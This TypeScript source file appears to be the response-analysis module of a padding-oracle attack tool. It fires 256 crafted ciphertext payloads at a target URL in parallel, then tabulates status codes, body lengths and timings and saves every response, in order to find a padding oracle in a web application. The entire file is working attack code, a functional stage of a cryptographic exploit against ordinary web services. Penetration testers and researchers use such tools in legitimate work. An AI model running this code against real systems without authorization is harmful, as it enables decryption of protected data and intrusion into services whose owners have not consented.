import bluebird from './bluebird' // eslint-disable-line import/order

import path from 'path'
import ow from 'ow'
import fse from 'fs-extra'
import tmp from 'tmp-promise'
import chalk from 'chalk'
import { range, orderBy } from 'lodash'

import { getStatusCodeColor, stringifyHeaders } from './util'
import OracleCaller from './oracle-caller'
import { OracleResult, ResponseAnalysisOptions } from './types'
import { analysis } from './logging'

const { logStart, logCompletion } = analysis

type OracleResultWithPayload = OracleResult & { payload: Buffer };

const getResponseText = (res: OracleResultWithPayload) => `<!--
Saved by https://github.com/KishanBagaria/padding-oracle-attacker
From ${res.url}
Payload: ${res.payload.toString('hex')}
Time taken: ${res.timings.end - res.timings.start}ms

${res.statusCode}
${stringifyHeaders(res.headers)}
-->
${res.body}`

const byteRange = range(0, 256)
async function analyseResponses({
  url,
  blockSize,
  logMode = 'full',
  concurrency = 128,
  isCacheEnabled = true,
  saveResponsesToTmpDir = true,
  ...args
}: ResponseAnalysisOptions) {
  ow(blockSize, ow.number)
  ow(concurrency, ow.number)

  const tmpDirPath = saveResponsesToTmpDir
    ? (await tmp.dir({ prefix: 'poattack_' })).path
    : ''
  if (['full', 'minimal'].includes(logMode)) await logStart({ url, blockSize, tmpDirPath })

  const { callOracle, networkStats } = OracleCaller({
    url,
    isCacheEnabled,
    ...args
  })

  const statusCodeFreq: { [key: string]: number } = {}
  const bodyLengthFreq: { [key: string]: number } = {}
  const timesTakenArray: number[] = []
  const responses: { [key: number]: OracleResultWithPayload } = {}
  const fsPromises: Promise<void>[] = []
  const rows: string[][] = []
  async function processByte(byte: number) {
    const twoBlocks = Buffer.alloc(blockSize * 2)
    twoBlocks[blockSize - 1] = byte
    const req = await callOracle(twoBlocks)
    const res = { ...req, payload: twoBlocks }
    if (saveResponsesToTmpDir) {
      fsPromises.push(
        fse.writeFile(
          path.join(tmpDirPath, byte + '.html'),
          getResponseText(res)
        )
      )
    }
    const { statusCode } = req
    const cl = req.body.length
    responses[byte] = res
    statusCodeFreq[statusCode] = (statusCodeFreq[statusCode] || 0) + 1
    bodyLengthFreq[cl] = (bodyLengthFreq[cl] || 0) + 1
    timesTakenArray.push(req.timings.end - req.timings.start)
    const color = getStatusCodeColor(statusCode)
    rows.push([String(byte), chalk[color](String(statusCode)), String(cl)])
  }
  if (concurrency > 1) {
    await bluebird.map(byteRange, processByte, { concurrency })
  } else {
    for (const byte of byteRange) await processByte(byte)
  }

  await Promise.all(fsPromises)

  if (['full', 'minimal'].includes(logMode)) {
    const responsesTable = orderBy(rows, [1, 2, x => +x[0]])
    logCompletion({
      responsesTable,
      networkStats,
      statusCodeFreq,
      bodyLengthFreq,
      timesTakenArray,
      tmpDirPath,
      isCacheEnabled
    })
  }
  return {
    responses,
    statusCodeFreq,
    bodyLengthFreq,
    timesTakenArray,
    tmpDirPath
  }
}

export default analyseResponses
